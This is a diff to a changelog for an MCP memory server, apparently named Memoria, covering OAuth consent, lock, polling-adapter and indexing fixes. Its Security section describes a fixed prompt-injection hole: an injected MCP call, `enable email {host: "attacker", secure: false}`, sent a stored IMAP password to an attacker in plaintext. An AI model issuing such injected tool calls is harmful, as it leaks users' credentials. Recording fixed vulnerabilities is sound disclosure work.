@@ -42,7 +42,17 @@ start** (see below); access counts gathered so far start over.
   `enable`/`configure` accept `pollIntervalSec` and `importanceThreshold`;
   hosts, credentials, paths and labels change only in the dashboard.
 - **`client_credentials` is refused while
-  `MEMORIA_AUTHORIZE_REQUIRE_APPROVAL=true`.**
+  `MEMORIA_AUTHORIZE_REQUIRE_APPROVAL=true`**, and a dashboard login no
+  longer approves by itself: `/authorize` shows a consent page and issues
+  the code when you click Approve.
+- **Dashboard consent and source-settings routes refuse OAuth tokens**
+  issued to MCP clients; use a dashboard login or the API key.
+- **Disabling a source in the dashboard withdraws its consent**; enabling
+  it again asks again.
+- **The store lock keeps a heartbeat.** A lock held by a live server on
+  another host is waited on, then refused; deployments that overlap
+  instances on one store by design (Cloud Run rollouts) set
+  `MEMORIA_LOCK_TAKEOVER=true`, as `deploy/gcp/cloudbuild.yaml` now does.
 
 ### Security
 
@@ -51,14 +61,22 @@ start** (see below); access counts gathered so far start over.
   longer advertised) while the gate is on. The gate's `memoria_approve`
   cookie is `SameSite=Lax`, because browsers withhold `Strict` cookies on
   the cross-site navigation from claude.ai, so the gate could never be
-  passed in a real browser; each session cookie is honoured only on its
-  own path.
+  passed in a real browser. Because a Lax cookie is sent on any cross-site
+  navigation, it only unlocks a same-origin consent page whose
+  CSRF-bound POST issues the code (otherwise any page could trigger a
+  code for an attacker's pending flow). Each session cookie is honoured
+  only on its own path, and malformed or oversized PKCE challenges are
+  rejected before anything is stored.
 - A prompt-injected MCP caller could reuse a source's consent with its
   own settings: `enable email {host: "attacker", secure: false}` sent the
   stored IMAP password to the attacker in plaintext. Settings changes now
   require the dashboard. Removing a custom source revokes its consent, so
   a re-added source with the same id (another path or command) needs
-  consent again.
+  consent again. An OAuth token could also call the dashboard's consent
+  and configure routes; those now need a dashboard login or the API key.
+- `pollIntervalSec` had no maximum: values past 2^31-1 ms made
+  setInterval fire every 1ms (back-to-back IMAP logins and API calls).
+  It is capped at one day.
 - Ingestion's dedup search embedded the first 200 raw characters of every
   event before privacy enforcement, so with `MEMORIA_EMBEDDINGS=openai`
   local-only content (calendar notes, account numbers) reached OpenAI even
@@ -102,38 +120,52 @@ start** (see below); access counts gathered so far start over.
   switch or rebuild made every memory look new and restarted the decay
   and staleness clocks. It now comes from frontmatter `updated` (else
   `created`, else mtime) on a first index and from mtime when an indexed
-  file is edited, and re-embedding keeps a file's access history. Indexes
-  built by earlier versions are rebuilt once on start.
+  file is edited, and re-embedding keeps a file's access history; an edit
+  counts as a touch for staleness and decay. Indexes built by earlier
+  versions are re-embedded once on start, keeping access counts and last
+  reads (a provider change keeps them too, where it used to drop them).
+  Only ISO dates are read from frontmatter.
 - A file whose body was emptied (frontmatter only) kept its old chunks, so
   text deleted to redact it stayed searchable. Its chunks are now dropped.
 - A crash left a store lock naming the dead server's pid; in a restarted
   container node usually gets the same pid, so the lock named the new
   server itself and the store refused to open on every restart. Locks now
-  record the host and are tracked per process, so a leftover is reclaimed.
+  record the host, carry a heartbeat and are tracked per process by real
+  path, so a leftover is reclaimed; a server shutting down no longer
+  deletes a successor's lock, and a reclaim race that could let two
+  servers in is closed.
 - Collector sources marked enabled were never restarted after a server
   restart (the dashboard still said "Enabled"), and the collector only
   started when a collector tool, the dashboard or `/ingest` touched it.
-  Both servers now resume configured sources at startup.
+  Both servers now resume enabled sources at startup, in the background
+  and per source, retrying ones that fail every 10 minutes; lifecycle
+  operations on a source are serialized, so a resume racing a dashboard
+  enable no longer leaks a connection.
 - Adapter cursors only advance past what was collected, and are saved
   after every successful poll instead of only on a clean shutdown; a
-  failed poll or buffer write restores the cursor.
+  failed poll or buffer write restores the cursor. Shutdown, disable and
+  re-enable no longer save a live cursor a poll may have run ahead with.
   - IMAP passed `uid: true` in the fetch query rather than its options,
     so the UID cursor was matched against sequence numbers (polls returned
     nothing, or only the newest message). It also never reconnected after
-    a dropped connection and swallowed every error.
+    a dropped connection and swallowed every error. The cursor now records
+    UIDVALIDITY and restarts when the mailbox changes identity.
   - Gmail jumped its cursor to the mailbox's current history id after the
     first page and sliced off messages beyond `maxResults`, so a burst of
     mail lost everything past the first batch; a failed message fetch was
     dropped after the cursor moved.
   - macOS Calendar never returned its first-poll window (init set the
     cursor to "now"), lost every row past the 200th in a poll, and
-    reported query errors as an empty calendar.
+    reported query errors as an empty calendar. A full page tied on one
+    (sub-millisecond) modification time now moves on instead of repeating.
 - The dashboard's first-time setup for email and Google sources posted
   their settings to `/enable` flat, where they landed beside `settings`
   instead of in it, so those sources failed to start; and
   `memory_priority` `set_threshold` wrote a field no adapter reads.
 - Re-enabling a running source re-initialised it without releasing the
   old instance's connection or database handle.
+- `memory_lint`'s knowledge-gap check compared the blended search score to
+  a cut tied to the old ranking weights; it now gates on relevance.
 - Dashboard annotations use the atomic append helper; entity-page
   regeneration re-checks for human edits at write time; the custom
   file-watcher skips files over 10 MB instead of reading them whole.
